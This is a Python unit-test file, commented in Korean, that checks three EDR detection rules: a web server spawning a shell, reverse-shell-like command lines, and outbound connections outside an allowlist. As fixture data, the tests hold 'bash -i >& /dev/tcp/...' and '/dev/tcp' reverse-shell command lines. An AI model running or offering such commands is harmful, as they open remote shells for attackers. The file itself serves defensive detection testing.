"""
EDR 탐지 규칙 유닛 테스트 (EDR-001/002/003)
=============================================
_evaluate_rules(asset, proc, parent_name) 의 3개 규칙을 순수 로직으로 검증.
스모크 테스트(§7)가 EDR-002를 E2E로 확인하지만, 여기서 각 규칙의 트리거/비트리거
경계를 빠르게 회귀 커버한다.
"""
from services.edr.api.main import _evaluate_rules


def _rule_ids(alerts):
    return {a["rule_id"] for a in alerts}


# --- EDR-001: 웹서버가 쉘류 자식 프로세스 생성 -------------------------------

def test_edr001_web_spawns_shell():
    proc = {"pid": 10, "ppid": 1, "name": "bash", "cmdline": "bash", "connections": []}
    alerts = _evaluate_rules("gs", proc, parent_name="uvicorn")
    assert "EDR-001" in _rule_ids(alerts)


def test_edr001_normal_child_not_flagged():
    proc = {"pid": 10, "ppid": 1, "name": "ls", "cmdline": "ls -la", "connections": []}
    alerts = _evaluate_rules("gs", proc, parent_name="uvicorn")
    assert "EDR-001" not in _rule_ids(alerts)


# --- EDR-002: 리버스쉘 유사 커맨드라인 ---------------------------------------

def test_edr002_bash_i_reverse_shell():
    proc = {"pid": 20, "ppid": 5, "name": "bash",
            "cmdline": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "connections": []}
    assert "EDR-002" in _rule_ids(_evaluate_rules("gs", proc, parent_name=None))


def test_edr002_dev_tcp_pattern():
    proc = {"pid": 21, "ppid": 5, "name": "sh",
            "cmdline": "sh -c 'cat < /dev/tcp/1.2.3.4/9001'", "connections": []}
    assert "EDR-002" in _rule_ids(_evaluate_rules("gs", proc, parent_name=None))


def test_edr002_benign_cmdline_not_flagged():
    proc = {"pid": 22, "ppid": 5, "name": "python3",
            "cmdline": "python3 app.py --port 8001", "connections": []}
    assert "EDR-002" not in _rule_ids(_evaluate_rules("gs", proc, parent_name=None))


# --- EDR-003: allowlist 밖 outbound 연결 -------------------------------------

def test_edr003_unexpected_egress():
    proc = {"pid": 30, "ppid": 1, "name": "curl", "cmdline": "curl",
            "connections": [{"raddr": "8.8.8.8:4444", "status": "ESTABLISHED"}]}
    assert "EDR-003" in _rule_ids(_evaluate_rules("gs", proc, parent_name=None))


def test_edr003_allowlisted_port_ok():
    # 8010(event_collector)은 허용 목록 -> 경보 없음
    proc = {"pid": 31, "ppid": 1, "name": "python3", "cmdline": "python3",
            "connections": [{"raddr": "10.0.0.2:8010", "status": "ESTABLISHED"}]}
    assert "EDR-003" not in _rule_ids(_evaluate_rules("gs", proc, parent_name=None))


def test_edr003_non_established_ignored():
    proc = {"pid": 32, "ppid": 1, "name": "python3", "cmdline": "python3",
            "connections": [{"raddr": "8.8.8.8:4444", "status": "TIME_WAIT"}]}
    assert "EDR-003" not in _rule_ids(_evaluate_rules("gs", proc, parent_name=None))
